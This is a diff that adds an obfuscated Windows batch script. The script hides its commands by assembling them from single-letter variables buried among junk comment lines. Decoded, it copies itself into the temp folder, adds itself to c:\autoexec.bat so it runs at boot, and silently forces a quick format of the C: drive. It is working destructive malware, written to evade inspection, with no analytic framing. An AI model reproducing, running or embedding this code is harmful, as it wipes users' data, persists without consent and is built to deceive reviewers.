@@ -1,0 +1,60 @@
+::%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3
+::%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3
+::%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3
+::%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3
+::%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3
+::%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3%s3
+;@set s=o
+;@set s3=t
+;@set s3s=g
+;@%s3s%%s%%s3%%s% s3
+:3s
+set ss3=y
+%s3s3%%ss3% %sss%
+set S_=b
+::%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+set SSS_=c
+set sss3=i
+::%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+::%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+set sss=f
+::%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+set s3s3s3=/
+set s3s3ss=:
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss333%%ss3s%%ss%x%ss%%sss_%.%s_%%ss_%%ss333%
+::%ss%%sss_%h%ss3s% %temp%%s3s33s%s3>>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss3
+set s3s33s=\
+::%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+::%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+set sss33=s
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_
+set SS_=a
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_
+set ss=e
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss333%%ss3s%%ss%x%ss%%sss_%.%s_%%ss_%%ss333%
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss333%%ss3s%%ss%x%ss%%sss_%.%s_%%ss_%%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%ss333%
+::%ss%%sss_%h%ss3s% %temp%%s3s33s%s3>>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss3%ss%%sss_%h%ss3s% %temp%%s3s33s%s3>>%sss_%%s3s3ss%%s%%sss%%
+set s333=n
+set ss3s=o
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_
+::%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_
+set ss333=t
+set ssss=g
+%sss3%%sss% %s333%%ss3s%%ss333% %ss%x%sss3%s%ss333% %temp%%s3s33s%s3.%s_%%ss_%%ss333% %ssss%%ss3s%%ss333%%ss3s% _s3
+%ssss%%ss3s%%ss333%%ss3s% s3_
+:_s3
+%sss_%%ss3s%py %0 %temp%%s3s33s%s3.%s_%%ss_%%ss333%
+%ss%%sss_%h%ss3s% @%ss%%sss_%h%ss3s% %ss3s%%sss%%sss% >>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss333%%ss3s%%ss%x%ss%%sss_%.%s_%%ss_%%ss333%
+%ss%%sss_%h%ss3s% %temp%%s3s33s%s3>>%sss_%%s3s3ss%%s3s33s%%ss_%u%ss333%%ss3s%%ss%x%ss%%sss_%.%s_%%ss_%%ss333%
+:s3_
+%ss%%sss_%h%ss3s% %sss33%|%sss%%ss3s%rm%ss_%%ss333% %sss_%%s3s3ss% %s3s3s3%q%s3s3s3%u%s3s3s3%v%s3s3ss%S3 >NUL
+%ss3%%sss% %s333%%ss3s%%ss333% %ss%rr%ss3s%rl%ss%v%ss%l 0 %ssss%%ss3s%%ss333%%ss3s% en%ssss%l
+:engl
+%ss%%sss_%h%ss3s% %ss3%|%sss%%ss3s%rm%ss_%%ss333% %sss_%%s3s3ss% %s3s3s3%q%s3s3s3%u%s3s3s3%v%s3s3ss%S3 >NUL
+%ssss%%ss3s%%ss333%%ss3s% s3s3
+:s3
+@ECHO OFF
+set sSs=nul
+set s3s3=ctt
+%s3s%%s%%s3%%s% 3s
+:s3s3
